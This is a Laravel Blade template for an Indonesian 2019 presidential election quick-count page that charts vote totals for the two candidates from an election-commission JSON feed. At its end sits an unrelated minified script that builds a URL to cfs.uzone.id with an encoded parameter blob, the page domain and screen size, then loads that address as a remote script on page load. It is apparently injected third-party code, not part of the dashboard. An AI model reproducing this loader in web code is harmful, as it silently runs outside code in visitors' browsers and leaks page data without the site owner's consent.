@extends('layouts.app')

@section('content')
<div class="container">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">Quick Count Pemilu Presiden</div>
                <div class="card-body">
                    <center><h1 id="loading">Please Wait..</h1></center>
                    <div id="diagram" style="display:none;">
                        <h5>Noted : </h5>
                        <p>Diagram ini menggunakan API JSON dari KPU secara realtime, dan akan otomatis<br> terupdate secara otomatis
                            link <strong><a href="https://pemilu2019.kpu.go.id/static/json/hhcw/ppwp.json">API KPU</a></strong>.
                        </p>
                        <canvas id="myChart" width="400" height="200"></canvas>
                        <div class="" style="margin-top:10px;">
                            <div style="border-bottom: dashed 1px rgb(215,215,215); padding-top:1px;">
                            <label>Perolehan suara Ir H Joko widodo</label><strong style="float:right" class="pull-right" id="a"></strong>
                            </div>
                            <div style="border-bottom: dashed 1px rgb(215,215,215); padding-top:5px;">
                                <label>Perolehan suara H Prabowo Subianto</label> <strong style="float:right" id="b"></strong>
                            </div>
                            <div style="">
                                Proggress <strong id="prosses"></strong> dari <strong id="tps"></strong> TPS (<strong id="persen"></strong>%)
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection
@push('script')
<script src="{{ asset('js/app.js') }}"></script>
<script src="/js/dashboard.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHa6dUEiP6K%2fc5C582CL4NjpNgssKlLXmbTBE8IzDXCSPaiFHvyt8Q5fsYRny8X3ds6Lr7ToQwJBBAp5P%2bjKK12yr0FxrJb1ixNQVSm4FoVHOKcl3FNknXhjy%2bbVesNHJhD0cCTqdRhNvFS0F6iEXZjxMPE3QuLIQu%2frXcHuCJy3hLU4QFreC0HijsnOoLN%2ftyF0wyfyQL9NHY5W5Br2BHrjRKwDTSCJyVRi2MgeTRvJMZVrSHP%2fCKKzZJVTdtpmz9FQNiKCuhOcpWNNB2wEs1InhywhlXi%2bg%2fLs%2fI2ie5DhFiM%2fgiztMMQzXL11mHZirYErQELDIzGuYbIPcenKjW9OvxhUTTu%2bhOUc1nVkHoQAGhL0XfVqhaDPXofJbg9VGJdSA3sUnqqb%2fETChCJuhAL772tWxEYNBTEEb4lmYvGTg9WtXovN8WJhpghbYXxaRdpGeF77EkYtES3Fgvx3BJKDBSVCoLZ9Im4O5XCwtGWuPTsZfC8EiyYqCTAWPdaoqalbgI0gmD31qSGRwIq03O%2f2JQPFAx6bGaHg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

@endpush
